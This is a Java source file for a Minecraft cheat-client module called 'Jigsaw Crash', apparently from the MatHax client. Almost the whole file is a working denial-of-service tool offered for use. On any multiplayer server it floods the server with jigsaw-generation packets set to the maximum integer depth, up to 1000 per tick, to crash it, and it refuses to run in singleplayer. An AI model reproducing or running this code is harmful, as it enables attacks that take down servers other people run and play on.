package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.BoolSetting;
import mathax.client.settings.IntSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.utils.Utils;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.JigsawGeneratingC2SPacket;
import net.minecraft.util.math.BlockPos;

public class JigSawCrash extends Module {

    private final Setting<Integer> amount;

    private final Setting<Boolean> autoDisable;
    private final Setting<Boolean> keepJigsaws;
    public JigSawCrash() {
        super(Categories.Crash, Items.STONECUTTER, "Jigsaw Crash", "CRYSTAL || Want to play a game? Attempts to crash the server you are on by using JigSaw update packets.");

        SettingGroup sgGeneral = settings.getDefaultGroup();
        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build());
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
        keepJigsaws = sgGeneral.add(new BoolSetting.Builder()
            .name("Keep Jigsaws")
            .description("Toggle if it keeps the jigsaws in JigsawGeneratingC2SPacket.")
            .defaultValue(true)
            .build());
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if(!mc.isInSingleplayer()) {
            if (Utils.canUpdate()) {
                int i = 0;
                if (i >= amount.get()) {
                    return;
                }
                do {
                    if (mc.player != null && mc.world != null) {
                        mc.player.networkHandler.sendPacket(new JigsawGeneratingC2SPacket(BlockPos.ORIGIN, Integer.MAX_VALUE, keepJigsaws.get()));
                    }
                    i++;
                } while (i < amount.get());
            } else {
                return;
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }
}
